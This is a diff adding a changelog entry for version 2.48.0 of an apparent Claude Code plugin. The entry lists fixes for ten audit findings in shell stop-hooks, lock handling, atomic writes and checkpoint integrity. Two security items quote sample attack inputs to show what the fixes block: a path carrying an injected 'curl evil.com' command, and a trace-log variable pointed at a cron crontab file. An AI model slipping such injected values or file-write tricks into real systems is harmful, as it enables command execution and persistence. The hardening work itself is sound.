@@ -1,5 +1,24 @@
 # Changelog
 
+## [2.48.0] - 2026-04-14
+
+### Fixed
+
+Resolves all 10 P1 findings from `tmp/audit/20260414-012408/TOME.md` — stop-hook + migration + checkpoint hardening.
+
+- **T1 / FLAW-002+BACK-001+RUIN-002** (`lib/rune-state.sh`): Migration lock `rmdir` replaced with `rm -rf` at both exit points; added stale-lock detection (`find -mmin +5`) on acquire so crashed prior sessions self-heal instead of silently skipping `.claude/→.rune/` migration forever.
+- **T2 / STOP-002** (`arc-batch-stop-hook.sh:458-461`): `_abort_batch` else-branch no longer falls back to direct `> PROGRESS_FILE` overwrite on mktemp failure. Preserves existing progress (resumable via `--resume`) instead of risking 0-byte truncation from a mid-write kill.
+- **T3 / STOP-003** (`on-session-stop.sh`): Sources `arc-stop-hook-common.sh` and replaces 8 bare `rm -f` on loop state files with `arc_delete_state_file()` (3-tier guard). Reopens the v1.101.1 infinite-loop bug on immutable filesystems would have recurred without this. Inline fallback shim added for defensive boot.
+- **T4 / STOP-001** (`context-percent-stop-guard.sh`): Uses `resolve_cwd()` from `stop-hook-common.sh` (CLAUDE_PROJECT_DIR fallback) and short-circuits on empty CWD before the threshold block. Prevents two competing exit-2 prompts when arc phase loop is active but CWD is absent from Stop input.
+- **T5 / HOOK-001** (`hooks/hooks.json`, `on-stop-failure.sh`, `CLAUDE.md`): `StopFailure` is not a valid Claude Code hook event. Entry renamed to `_StopFailure_disabled` (Claude Code ignores unknown keys), script header marked as orphan pending migration, CLAUDE.md hook table corrected. Users now know API-error checkpoint preservation is NOT active.
+- **T6 / SEC-002** (`arc-batch-stop-hook.sh`, `arc-hierarchy-stop-hook.sh`, `arc-issues-stop-hook.sh`): GUARD 9/11 upgraded from non-anchored negative char-class to explicit anchored positive match `^[a-zA-Z0-9._/-]+$`. Prevents NEXT_PLAN / NEXT_CHILD prompt injection via crafted paths like `plan.md; curl evil.com #`.
+- **T7 / SEC-001+SEC-009** (`detect-workflow-complete.sh`, `on-session-stop.sh`): TMPDIR/tmp allowlist case-pattern applied to `RUNE_TRACE_LOG` before any trace write. Blocks arbitrary-file-write via `RUNE_TRACE_LOG=/var/spool/cron/crontabs/user` + `RUNE_TRACE=1`. Matches canonical mitigation in `session-team-hygiene.sh:71-74`.
+- **T8 / RUIN-001+RUIN-005** (`learn/echo-writer.sh`, `on-task-observation.sh`): `cat TMPFILE >> MEMORY_FILE` replaced with stage-to-sibling-temp + atomic `mv -f`. A killed or timed-out append no longer corrupts the MEMORY.md echo index.
+- **T9 / RUIN-004** (`lib/checkpoint-update.sh`): Post-write non-empty + valid-JSON verification before `mv`; best-effort `sync` after `mv` for durability; clearer ENOSPC / disk-full diagnostics. Prevents silent revert of completed arc phases when a write truncates.
+- **T10 / FLAW-001** (`rune-statusline.sh`): `USED`/`REMAINING` normalized to `0`/`100` when missing or non-numeric, before arithmetic `[[ -ge ]]` compares. Prior `[[ "" -ge 90 ]]` was a fatal bash error that triggered the ERR trap, leaving `context-percent-stop-guard` and `rune-context-monitor` reading stale bridge data.
+
+Version bumped MINOR because `hooks.json` renames a hook key and `on-session-stop.sh` introduces a new library dependency — both observable contract changes, though neither breaks existing behavior.
+
 ## [2.47.2] - 2026-04-14
 
 ### Fixed
